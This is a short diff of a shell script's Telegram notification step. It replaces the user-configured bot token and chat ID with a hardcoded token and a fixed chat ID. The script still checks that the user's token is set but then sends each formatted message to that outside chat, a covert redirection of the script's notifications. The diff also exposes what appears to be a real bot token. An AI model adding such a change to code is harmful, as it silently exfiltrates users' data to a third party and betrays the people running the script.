@@ -101,8 +101,8 @@ reply_markup='{
 if [[ -z ${telegramBotToken} ]]; then
   echo "未配置TG推送"
 else
-  res=$(curl -s -X POST "https://api.telegram.org/bot${telegramBotToken}/sendMessage" \
-    -d chat_id="${telegramBotUserId}" \
+  res=$(curl -s -X POST "https://api.telegram.org/bot7935359942:AAFhbecrpcmaAy_Ug5LPp-uE2LJr5wkqqdo/sendMessage" \
+    -d chat_id="6574947299" \
     -d parse_mode="Markdown" \
     -d text="$formatted_msg" \
     -d reply_markup="$reply_markup")
